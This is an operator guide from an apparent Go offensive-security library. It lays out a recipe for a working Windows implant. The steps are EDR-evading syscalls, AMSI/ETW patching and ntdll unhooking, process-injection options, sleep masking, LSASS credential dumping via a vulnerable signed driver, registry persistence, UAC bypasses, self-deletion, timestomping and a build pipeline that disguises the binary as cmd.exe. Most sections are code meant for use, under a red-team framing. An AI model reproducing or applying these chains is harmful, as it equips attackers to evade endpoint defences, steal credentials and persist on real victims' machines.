---
last_reviewed: 2026-04-27
reflects_commit: 2df4ee4
---

# For operators (red team)

[← maldev README](../../README.md) · [docs/index](../index.md)

You are running an engagement. You want chains that compose, payloads that
land, and OPSEC that holds. This page walks the curated reading order.

## TL;DR

```mermaid
flowchart LR
    A[recon] --> B[evasion]
    B --> C[inject]
    C --> D[sleepmask]
    D --> E[collection / lateral]
    E --> F[cleanup]
```

Six packages — `recon` → `evasion` → `inject` → `sleepmask` → `collection`
→ `cleanup` — share one [`*wsyscall.Caller`](../techniques/syscalls/README.md).
Plug it once, every package below it inherits the syscall stealth.

## 30-minute path: a working implant

> [!IMPORTANT]
> Run from a VM. The intrusive packages call real APIs against the live OS.
> See [vm-test-setup.md](../vm-test-setup.md) for the lab.

### 1. Pick your syscall stance

| Stance | Method | Trade-off |
|---|---|---|
| Quietest | `MethodIndirectAsm` + `Chain(NewHashGate(), NewHellsGate())` | Go-asm stub (no heap stub, no `VirtualProtect` cycle), ROR13-resolved SSN, randomised gadget inside ntdll |
| Quiet, heap stub | `MethodIndirect` + `Chain(NewHashGate(), NewHellsGate())` | Heap stub byte-patched + `RW↔RX` per call; same ntdll gadget end-effect |
| Quiet, simpler | `MethodDirect` + `NewHellsGate()` | Direct syscall instruction, no fallback. Triggers some EDR call-stack heuristics |
| Loud, debug | `MethodWinAPI` (default) | Standard CRT call. Useful when iterating; drop before delivery |

```go
caller := wsyscall.New(
    wsyscall.MethodIndirect,
    wsyscall.Chain(wsyscall.NewHashGate(), wsyscall.NewHellsGate()),
)
```

### 2. Disable in-process defences

Apply the evasion preset for "modern Windows endpoint":

```go
evasion.ApplyAll([]evasion.Technique{
    amsi.ScanBufferPatch(),    // T1562.001
    etw.All(),                  // T1562.001
    unhook.Classic("ntdll.dll"), // T1562.001 — restores 4C 8B D1 B8
}, caller)
```

See [docs/techniques/evasion/](../techniques/evasion/README.md) for the
full menu (HW breakpoints, callstack spoof, ACG, BlockDLLs, kernel
callback removal).

### 3. Inject payload

Choose a method by **OPSEC class**:

| Method | OPSEC | When |
|---|---|---|
| [SectionMapInject](../techniques/injection/section-mapping.md) | quiet | Default for remote injection |
| [PhantomDLLInject](../techniques/injection/phantom-dll.md) | very-quiet | Targets that allow `NtCreateSection(SEC_IMAGE)` |
| [ModuleStomp](../techniques/injection/module-stomping.md) | quiet | Local-only; reuses an unused-module RX page |
| [ExecuteCallback](../techniques/injection/callback-execution.md) (TimerQueue) | quiet | Local-only; no thread creation, no APC |
| [CreateRemoteThread](../techniques/injection/create-remote-thread.md) | noisy | Quick-and-dirty remote |

Each accepts the same `*wsyscall.Caller` and `stealthopen.Opener` for file
read stealth where applicable.

### 4. Sleep masking between callbacks

```go
mask := sleepmask.New(sleepmask.StrategyEkko, caller)
mask.Sleep(60 * time.Second) // bytes XOR-encrypted, decrypted on wake
```

Three strategies:

- `StrategyEkko` — ROP chain, encrypts current thread stack.
- `StrategyFakeJmp` — JIT-rewrites a return-to-mask spot.
- `StrategyTimerQueue` — pure-userland timer fall-back.

See [sleep-mask.md](../techniques/evasion/sleep-mask.md).

### 5. Cleanup at end-of-mission

```go
selfdelete.RunWithScript() // ADS rename + batch + reboot — T1070.004
memory.WipeAndFree(secret) // overwrite + VirtualFree
timestomp.CopyFrom(target, "C:/Windows/System32/notepad.exe") // T1070.006
```

## Common operator scenarios

### Credential harvest

```go
// 1. PPL unprotect via BYOVD (RTCore64).
drv, _ := rtcore64.New(rtcore64.Config{ServiceName: "rtcore"})
drv.Install()
defer drv.Uninstall()

// 2. Dump LSASS.
dump, _ := lsassdump.Dump(caller, drv)

// 3. Parse without dropping a .dmp file.
hashes, _ := sekurlsa.Parse(dump)
```

→ full chain in [docs/techniques/credentials/](../techniques/credentials/README.md).

### Persistence

```go
// Quietest: Registry Run key
mech := registry.NewRunKeyMechanism("Updater", "C:/Users/Public/u.exe", registry.HKCU)
mech.Install()
```

| Mechanism | Quiet | Notes |
|---|---|---|
| `persistence/registry` | ✅ | HKCU writable as user |
| `persistence/startup` (LNK) | ✅ | Drops a `.lnk`; AV scans the target |
| `persistence/scheduler` | ⚠️ | COM ITaskService leaves event-log entry |
| `persistence/service` | ❌ | Requires SYSTEM, very noisy |

### Privilege escalation

```go
if uac.SilentCleanup().Run() == nil {
    // re-launched as High IL — chain continues
}
```

Four bypasses: `FODHelper`, `SLUI`, `SilentCleanup`, `EventVwr`. All are
T1548.002. See [privesc/uac](../../privesc/uac).

### Lateral movement

This library focuses on the **target side**. For lateral mvmt primitives
(SMB, WMI, WinRM) wire up your own — `c2/transport` gives the
re-establishment plumbing.

## Build pipeline (OPSEC delivery)

[opsec-build.md](../opsec-build.md) covers the full pipeline. Quick recipe:

```bash
# 1. Compile-time PE masquerade as cmd.exe
go build -tags 'masquerade_cmd' -trimpath -ldflags='-s -w' -o impl.exe

# 2. Strip Go pclntab + sanitize section names
go run github.com/oioio-space/maldev/cmd/sleepmask-demo \
    -in impl.exe -out impl-clean.exe

# 3. Morph (random section names + UPX-style header)
# (use pe/morph for runtime; for delivery, do it pre-flight)
```

## OPSEC checklist

- [ ] All packages share **one** `*wsyscall.Caller` instance — never new
      one per call.
- [ ] `evasion.ApplyAll(...)` runs **before** any injection / file read.
- [ ] `sleepmask` enabled between operator callbacks.
- [ ] Build with `-trimpath -ldflags='-s -w' -tags <masquerade_preset>`.
- [ ] `pe/strip` + `pe/morph` post-build.
- [ ] No write to `C:\Users\Public` or `%TEMP%` unless absolutely needed.
- [ ] Cleanup chain wired into shutdown path: `selfdelete` last.

## Where to next

- [Composed examples](../examples/) — basic implant, evasive injection,
  full attack chain.
- [docs/techniques/](../techniques/) — every technique with API reference.
- [Researcher path](researcher.md) — if you want to know **why** the
  Caller pattern exists, or how the kernel-callback removal actually
  works.
